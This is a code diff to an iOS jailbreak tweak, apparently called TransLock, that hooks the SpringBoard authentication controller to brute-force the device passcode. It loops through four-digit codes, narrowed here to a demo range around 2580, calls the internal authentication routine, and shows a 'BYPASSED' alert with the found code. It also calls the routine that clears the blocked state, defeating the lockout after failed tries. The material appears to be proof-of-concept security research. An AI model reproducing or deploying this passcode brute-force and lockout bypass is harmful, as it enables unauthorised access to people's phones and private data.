@@ -4,6 +4,7 @@
 -(BOOL)_isPermanentlyBlocked;
 -(BOOL)_authenticateWithPasscodeData:(id)arg1 outError:(id*)arg2;
 -(void)_unblockTimerFired;
+-(void)_clearBlockedState ;
 @end
 
 @interface TransLock : NSObject
@@ -43,13 +44,14 @@ NSString *numString;
 %hook SBFUserAuthenticationController
 static BOOL hasBeenCalled = NO;
 -(BOOL)_isTemporarilyBlocked {
-	if (hasBeenCalled) {
+	if (!hasBeenCalled) {
 		HBLogDebug(@"i AM BEING CALLED");
-		double delayInSeconds = 15.0;
+		double delayInSeconds = 1.0;
 	dispatch_time_t popTime = dispatch_time(DISPATCH_TIME_NOW, delayInSeconds * NSEC_PER_SEC);
 	dispatch_after(popTime, dispatch_get_main_queue(), ^(void){
 		HBLogDebug(@"WELCOME TO THE JUNGLE!");
-		for (int i = 0; i <= 9999; i++)
+		//: For this demo i'll be using 2580 as my test passcode
+		for (int i = 2576; i <= 2581; i++)
 		{
 			numString = [NSString stringWithFormat:@"%04d", i];
 			NSLog(@"Testing : %@", numString);
@@ -58,9 +60,13 @@ static BOOL hasBeenCalled = NO;
 			NSLog(@"The result is : %d", result);
 
 			if (result == YES) {
-				[[[UIAlertView alloc] initWithTitle:@"TransLock" message:[NSString stringWithFormat:@"Password is %@", numString] delegate:nil cancelButtonTitle:@"Dismiss" otherButtonTitles:nil] show];
+				[[[UIAlertView alloc] initWithTitle:@"BYPASSED" message:[NSString stringWithFormat:@"Password is %@", numString] delegate:nil cancelButtonTitle:@"Dismiss" otherButtonTitles:nil] show];
 				NSLog(@"Password is : %@", numString);
 				break;
+			} else {
+				//[self _unblockTimerFired];
+				HBLogDebug(@"I WAS CALLED LOL");
+
 			}
 		}
 
@@ -95,10 +101,7 @@ static BOOL hasBeenCalled = NO;
 	HBLogDebug(@"_extendedKeybagState %lld", val);
 	return val;
 }
--(void)dealloc {
-	HBLogDebug(@"dealloc");
-	%orig;
-}
+//: Prints out SBFUserAuthenticationController: 0x1744e1580; authState: Revoked; passcodeSet: YES
 -(NSString *)description {
 	NSString *val = %orig;
 	HBLogDebug(@"description %@", val);
@@ -113,6 +116,7 @@ static BOOL hasBeenCalled = NO;
 	HBLogDebug(@"keybagDidUnlockForTheFirstTime, value: %@", val);
 	%orig;
 }
+//: Prints out SBFUserAuthenticationController: 0x1744e1580; authState: Revoked; hasPasscodeSet: YES; revokedAuthDate: 2018-08-12 16:59:23 -0400
 -(id)publicDescription {
 	id val = %orig;
 	HBLogDebug(@"publicDescription, value: %@", val);
@@ -151,7 +155,7 @@ static BOOL hasBeenCalled = NO;
 	%orig;
 }
 -(void)_clearUnblockTimer {
-	//HBLogDebug(@"_clearUnblockTimer");
+	HBLogDebug(@"_clearUnblockTimer");
 	//%log;
 	%orig;
 }
@@ -190,6 +194,8 @@ static BOOL hasBeenCalled = NO;
 	BOOL val = %orig;
 	HBLogDebug(@"_boolForAuthenticationResult %d", val);
 	%log;
+	[self _clearBlockedState];
+
 	return val;
 }
 //: called when pass is correct
@@ -203,7 +209,7 @@ static BOOL hasBeenCalled = NO;
 	HBLogDebug(@"_handleFailedAuthentication");
 	%log;
 	//%orig;
-	return;
+	[self _clearBlockedState];
 }
 -(void)_handleInvalidAuthentication:(id)arg1 responder:(id)arg2 {
 	HBLogDebug(@"_handleInvalidAuthentication");
@@ -212,12 +218,12 @@ static BOOL hasBeenCalled = NO;
 }
 //: This triggers the timer
 -(void)_scheduleUnblockTimer {
-	//HBLogDebug(@"_scheduleUnblockTimer");
+	HBLogDebug(@"_scheduleUnblockTimer");
 	%log;
 	//%orig;
 	HBLogDebug(@"Lets bypass this timer!");
 	//[self _unblockTimerFired];
-	return;
+	%orig;
 }
 -(void)_setAuthState:(long long)arg1  {
 	//HBLogDebug(@"_setAuthState");
@@ -492,11 +498,7 @@ static BOOL hasBeenCalled = NO;
 	HBLogDebug(@"_setUnblockTimer... value %@", arg1);
 	%orig;
 }
--(double)_timeUntilUnblockedSinceReferenceDate {
-	double val = %orig;
-	HBLogDebug(@"_timeUntilUnblockedSinceReferenceDate... value %f", val);
-	return val;
-}
+
 /*
 -(void)_setAuthenticationState:(long long)arg1 ;
 -(BOOL)_lastAuthStateWasAuthenticated;
